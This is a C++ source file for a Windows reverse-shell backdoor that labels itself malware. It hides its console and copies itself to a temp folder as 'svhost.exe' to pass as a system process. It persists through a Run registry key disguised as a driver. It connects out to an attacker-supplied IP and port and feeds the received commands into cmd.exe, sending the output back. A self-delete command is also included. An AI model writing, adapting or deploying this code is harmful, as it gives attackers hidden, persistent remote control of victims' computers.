#define WIN32_LEAN_AND_MEAN

#include "Windows.h"
#include "stdio.h"
#include "tchar.h"
#include "strsafe.h"
#include "winsock2.h"
#include "ws2tcpip.h"
#include <stdio.h>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma warning(disable::4996)
#pragma comment (lib, "Wininet.lib")
#pragma comment (lib, "User32.lib")
#pragma comment (lib, "Kernel32.lib")
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "Urlmon.lib"
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma warning(disable::4996)
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


//global variable
char IP[20], port[20];
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
static TCHAR desireDirPath[MAX_PATH];
static TCHAR malwareNamePath[MAX_PATH]; //malware file's name and path

//sub function
bool CheckFirstRun();
void Self_Delete();
void GetDir();
void AutoCopy();
void AutoRun();
void CreateChildProcess(void);
void WriteToPipe(char recvCommand[]);
DWORD WINAPI  ReadFromPipe(LPVOID lpParam);
void SetUp();
DWORD WINAPI OpenBackDoor(LPVOID lpParam);

int main(int argc, char* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (argc < 3) {
		return 0;
	}
	strcpy_s(IP, argv[1]);
	strcpy_s(port, argv[2]);
	//main execute
	if (CheckFirstRun())
	{
		GetDir();
		AutoCopy();
		AutoRun();
		//Self_Delete();
		//return 0;
	}
	//MessageBox(NULL, L"Fuck", L"Fuck", MB_OK);

	HANDLE hThread;
	hThread = CreateThread(NULL, 0, OpenBackDoor, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

bool CheckFirstRun()
{
	TCHAR currFileName[MAX_PATH];
	GetModuleFileName(NULL, currFileName, MAX_PATH);
	TCHAR name[] = L"svhost.exe";
	int idx = 0;
	for (int i = wcslen(currFileName) - 10; i <= wcslen(currFileName) - 1; ++i)
	{
		if (currFileName[i] != name[idx]) {
			return TRUE;
		}
		idx++;
	}
	return FALSE;
}

void Self_Delete()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
void GetDir()
{
	GetTempPath(MAX_PATH, desireDirPath);
	wcscat_s(desireDirPath, L"WPDNSE");

}
void AutoCopy()
{
	CreateDirectory(desireDirPath, NULL); //Create malware folder
	TCHAR fileNamePath[MAX_PATH]; //current file's name and path
	GetModuleFileName(NULL, fileNamePath, MAX_PATH);
	swprintf_s(malwareNamePath, MAX_PATH, L"%s\\svhost.exe", desireDirPath);
	CopyFile(fileNamePath, malwareNamePath, FALSE);
}
void AutoRun()
{
	char Driver[MAX_PATH];
	sprintf_s(Driver, "%S %s %s", malwareNamePath, IP, port);
	HKEY hKey;
	RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
	RegCloseKey(hKey);
}

DWORD WINAPI OpenBackDoor(LPVOID lpParam)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	char sendbuf[1024];
	char recvbuf[1024];
	int iResult;
	int recvbuflen = 1024;

	while (TRUE)
	{
		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			//printf("WSAStartup failed with error: %d\n", iResult);
			//return 1;
			continue;
		}

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(IP, port, &hints, &result);
		if (iResult != 0) {
			//printf("getaddrinfo failed with error: %d\n", iResult);
			WSACleanup();
			//return 1;
			continue;
		}
		// Attempt to connect to an address until one succeeds
		for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

			// Create a SOCKET for connecting to server
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
				ptr->ai_protocol);
			if (ConnectSocket == INVALID_SOCKET) {
				//printf("socket failed with error: %ld\n", WSAGetLastError());
				WSACleanup();
				//return 1;
				continue;
			}

			// Connect to server.
			iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				closesocket(ConnectSocket);
				ConnectSocket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		if (ConnectSocket == INVALID_SOCKET) {
			//printf("Unable to connect to server!\n");
			Sleep(30000);
			WSACleanup();
			continue;
		}
		SetUp();
		//char hello[] = "cmd.exe";
		//WriteToPipe(hello);

		// Receive until the peer closes the connection
		do {
			//Sleep(200);
			CreateThread(NULL, 0, ReadFromPipe, (LPVOID)ConnectSocket, 0, NULL);
			memset(recvbuf, 0, sizeof(recvbuf));
			iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			if (iResult == 0) break; //Server Close
			WriteToPipe(recvbuf);
			//ReadFromPipe(ConnectSocket);

		} while (TRUE);

		// cleanup
		closesocket(ConnectSocket);
		WSACleanup();
		Sleep(30000);

	}

	return 1;
}
void SetUp()
{
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited. 

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT. 

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		printf("StdoutRd CreatePipe");

	// Ensure the read handle to the pipe for STDOUT is not inherited.

	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		printf("Stdout SetHandleInformation");

	// Create a pipe for the child process's STDIN. 

	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
		printf("Stdin CreatePipe");

	// Ensure the write handle to the pipe for STDIN is not inherited. 

	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		printf("Stdin SetHandleInformation");

	// Create the child process. 

	CreateChildProcess();
}

void CreateChildProcess(void)
{
	TCHAR szCmdline[] = TEXT("cmd.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	 // If an error occurs, exit the application. 
	if (!bSuccess)
		printf("CreateProcess");
	else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 

		//WaitForInputIdle(piProcInfo.hProcess, INFINITE);
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);

		// Close handles to the stdin and stdout pipes no longer needed by the child process.
		// If they are not explicitly closed, there is no way to recognize that the child process has ended.

		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
	}
}

void WriteToPipe(char recvCommand[])

// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data. 
{
	DWORD dwWritten;
	BOOL bSuccess = FALSE;
	bSuccess = WriteFile(g_hChildStd_IN_Wr, recvCommand, strlen(recvCommand), &dwWritten, NULL);

	// Close the pipe handle so the child process stops reading. 

	//if (!CloseHandle(g_hChildStd_IN_Wr))
		//printf("StdInWr CloseHandle");
}

DWORD WINAPI  ReadFromPipe(LPVOID lpParam)

// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT. 
// Stop when there is no more data. 
{
	SOCKET Sock = (SOCKET)lpParam;
	DWORD dwRead, dwWritten;
	CHAR chBuf[1200];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	for (;;)
	{
		memset(chBuf, 0, sizeof(chBuf));
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 1000, &dwRead, NULL);
		//WaitForSingleObject(g_hChildStd_OUT_Rd, 2000);
		if (!bSuccess || dwRead == 0) break;
		//bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		send(Sock, chBuf, dwRead, 0);
		if (send <= 0) break;
	}
	return 1;
}